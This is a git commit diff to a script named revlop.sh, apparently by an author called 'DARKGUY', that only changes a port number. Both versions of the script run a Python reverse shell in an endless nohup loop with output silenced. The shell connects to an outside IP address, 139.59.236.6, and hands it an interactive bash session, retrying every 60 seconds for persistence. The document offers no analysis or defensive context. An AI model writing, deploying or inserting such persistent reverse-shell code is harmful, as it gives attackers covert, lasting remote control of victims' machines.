82697bbd86dfb0c846a400ce040cc4aa8682a672
DARKGUY <richardlevip2021@icloud.com>
2025-06-11 09:56:43 +0700

    Update revlop.sh

--- revlop.sh
+++ revlop.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
 while true; do
-  nohup python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("139.59.236.6",4442));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' >/dev/null 2>&1
+  nohup python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("139.59.236.6",4443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' >/dev/null 2>&1
   sleep 60
 done
